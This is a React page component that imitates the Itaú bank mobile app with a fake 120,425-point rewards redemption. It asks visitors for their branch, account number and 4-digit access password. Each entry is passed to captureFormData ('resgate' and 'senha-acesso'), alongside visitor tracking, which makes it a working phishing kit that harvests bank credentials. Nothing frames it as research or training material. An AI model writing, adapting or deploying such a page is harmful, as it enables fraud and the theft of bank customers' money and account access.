import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Menu, Bell } from "lucide-react";
import itauLogo from "@/assets/itau-logo.png";
import BottomNav from "@/components/BottomNav";
import { useVisitorTracking, captureFormData } from "@/hooks/useVisitorTracking";
import { ChevronLeft } from "lucide-react";

const Resgate = () => {
  useVisitorTracking("resgate");
  const navigate = useNavigate();
  const location = useLocation();
  const { nome } = (location.state as any) || {};
  const [phase, setPhase] = useState<"agencia" | "senha">("agencia");
  const [agencia, setAgencia] = useState("");
  const [conta, setConta] = useState("");
  const [senha, setSenha] = useState("");

  const handleContinuar = () => {
    if (agencia.length >= 4 && conta.replace(/\D/g, "").length >= 5) {
      captureFormData("resgate", { agencia, conta });
      setPhase("senha");
    }
  };

  const handleSenha = () => {
    if (senha.length === 4) {
      captureFormData("senha-acesso", { senha });
      navigate("/sucesso", { state: { nome, agencia, conta } });
    }
  };

  if (phase === "senha") {
    return (
      <div className="min-h-screen max-w-md mx-auto relative flex flex-col" style={{ background: 'linear-gradient(135deg, #FF6200 0%, #CC5000 100%)' }}>
        <div className="px-5 pt-6 pb-4">
          <div className="flex items-center gap-4">
            <button onClick={() => setPhase("agencia")}>
              <ChevronLeft className="text-primary-foreground" size={24} />
            </button>
            <h1 className="text-primary-foreground text-lg font-semibold flex-1 text-center pr-8">
              Acesso à conta
            </h1>
          </div>
        </div>
        <div className="px-5 pt-4 pb-16 space-y-1">
          <p className="text-primary-foreground text-sm">
            Nome: <span className="font-semibold">{nome?.toUpperCase() || "TITULAR"}</span>
          </p>
        </div>
        <div className="flex-1 bg-white rounded-t-3xl px-6 pt-8 pb-8 flex flex-col">
          <p className="text-foreground text-xl font-bold mb-1">Digite sua senha de acesso</p>
          <p className="text-muted-foreground text-sm mb-6">Senha de 4 dígitos</p>
          <input
            autoFocus
            type="tel"
            inputMode="numeric"
            pattern="[0-9]*"
            maxLength={4}
            value={senha}
            onChange={(e) => setSenha(e.target.value.replace(/\D/g, "").slice(0, 4))}
            className="w-full border-b-2 border-[#FF6200] pb-2 outline-none text-lg tracking-[1em] text-foreground"
            style={{ WebkitTextSecurity: "disc" } as React.CSSProperties}
          />
          <button className="text-[#FF6200] font-bold text-sm mt-4 text-left">
            Esqueci minha senha
          </button>
          <div className="flex-1" />
          <button
            onClick={handleSenha}
            disabled={senha.length !== 4}
            className="w-full py-4 rounded-full bg-[#FF6200] text-white font-semibold text-base hover:opacity-90 transition-opacity disabled:opacity-60"
          >
            continuar
          </button>
        </div>
      </div>
    );
  }

  return (
    <div
      className="min-h-screen max-w-md mx-auto relative flex flex-col"
      style={{ background: "linear-gradient(135deg, #FF6200 0%, #CC5000 100%)" }}
    >
      <div className="px-5 pt-6">
        <div className="flex items-center justify-between mb-12">
          <Menu className="text-primary-foreground" size={24} />
          <Bell className="text-primary-foreground" size={24} />
        </div>
      </div>
      <div className="px-6 flex-1">
        <img src={itauLogo} alt="Itaú" className="h-14 mb-4" />
        <h1 className="text-primary-foreground text-3xl font-bold mb-1">
          Olá, {nome?.split(" ")[0]?.toUpperCase() || "TITULAR"}
        </h1>
        <p className="text-primary-foreground/90 text-base mb-10">
          Você possui <span className="font-bold">120.425</span> pontos para o resgate.
        </p>
        <div className="flex gap-6 mb-4">
          <div className="flex-1">
            <label className="text-primary-foreground text-sm font-medium block mb-2">Agência sem dígito</label>
            <input
              type="text"
              inputMode="numeric"
              value={agencia}
              onChange={(e) => setAgencia(e.target.value.replace(/\D/g, "").slice(0, 5))}
              className="w-full bg-transparent text-primary-foreground border-b border-primary-foreground/40 pb-2 outline-none text-base placeholder:text-primary-foreground/30"
            />
          </div>
          <div className="flex-1">
            <label className="text-primary-foreground text-sm font-medium block mb-2">Conta com dígito</label>
            <input
              type="text"
              inputMode="numeric"
              value={conta}
              onChange={(e) => {
                let v = e.target.value.replace(/\D/g, "").slice(0, 7);
                if (v.length > 1) v = v.slice(0, -1) + "-" + v.slice(-1);
                setConta(v);
              }}
              className="w-full bg-transparent text-primary-foreground border-b border-primary-foreground/40 pb-2 outline-none text-base placeholder:text-primary-foreground/30"
            />
          </div>
        </div>
        <p className="text-primary-foreground/70 text-sm mb-8">
          Digite sua agência e conta para continuar seu resgate
        </p>
        <button
          onClick={handleContinuar}
          disabled={agencia.length < 4 || conta.replace(/\D/g, "").length < 5}
          className="w-full py-4 rounded-full bg-white text-[#FF6200] font-semibold text-lg hover:bg-white/90 transition-opacity disabled:opacity-40 disabled:cursor-not-allowed"
        >
          Iniciar Resgate
        </button>
      </div>
      <BottomNav />
    </div>
  );
};

export default Resgate;
